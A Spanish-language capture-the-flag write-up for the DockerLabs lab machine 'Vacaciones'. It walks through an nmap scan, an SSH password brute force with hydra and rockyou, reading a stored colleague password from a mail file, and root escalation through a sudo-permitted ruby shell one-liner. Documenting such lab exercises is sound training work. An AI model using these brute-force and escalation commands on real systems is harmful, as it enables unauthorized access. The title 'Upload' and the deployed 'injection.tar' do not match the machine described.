---
title: Upload - DockerLabs
categories: [ Linux ]
tags: [DockerLabs]
---

<img src="/assets/img/DLabs/vacaciones/vacaciones.png" alt="Captura de pantalla de la máquina Vacaciones en DockerLabs">

Hoy trataremos de explotar la máquina *Vacaciones* de [DockerLabs](https://dockerlabs.es/), de dificultad Muy Fácil. Vamos a visualizar el codigo fuente de la web y despues realizaremos ataques de fuerza bruta con **hydra**.

## Desplegamos la máquina

```bash
➤ sudo bash auto_deploy.sh injection.tar
[sudo] contraseña para nmc:     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla

```

## Escaneo NMAP

Antes que nada, deberemos hacer un escaneo de puertos con **nmap** para encontrar los puertos abiertos y qué servicios corren en ellos.

```bash
nmc@mate ~/D/D/vacaciones [16:36]
➤ nmap -sV -p- --min-rate=5000 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-27 16:36 CST
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds
```



Nos percatamos de que está abierto el puerto <mark>80</mark> con el servicio HTTP. Entramos a la web con el puerto 80: <mark>http://172.17.0.2:80</mark> y nos carga una pagina en blanco, pero inspeccionamos su codigo fuente y encontramos un comentario.

<img src="/assets/img/DLabs/vacaciones/view-vacaciones.png" alt="Captura de pantalla de la máquina Vacaciones en DockerLabs">

## Hydra

Utilizamos **hydra** con los usuarios **Camilo** y **Juan** al **ssh**:

```bash
➤ hydra -l camilo -P /usr/share/wordlists/rockyou.txt -t 50 ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344398 login tries (l:1/p:14344398), ~286888 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-27 16:47:12
```



Iniciamos sesion con las credenciales de **Camilo**:

```bash
➤ ssh camilo@172.17.0.2
camilo@172.17.0.2's password: 
$
```



## Escalada de privilegios

Revisamos el *correo* que nos indicaba en la web

```bash
$ cd /var/mail
$ cd camilo
$ cat correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```



Iniciamos sesion en con el usuario **Juan**:

```bash
➤ ssh juan@172.17.0.2
juan@172.17.0.2's password: 
$
```



Hacemos un **sudo -l**:

```bash
$ sudo -l
Matching Defaults entries for juan on 05af69235c0b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on 05af69235c0b:
    (ALL) NOPASSWD: /usr/bin/ruby 
```



Podemos ejecutar **ruby** como el usuario **root**:

```bash
$ sudo /usr/bin/ruby -e 'exec "/bin/bash"'
root@05af69235c0b:~#
```



```bash
root@05af69235c0b:~# whoami
root
root@05af69235c0b:~#
```



## Acceso ROOT obtenido

¡Máquina comprometida! Te deseo un feliz hackeo.
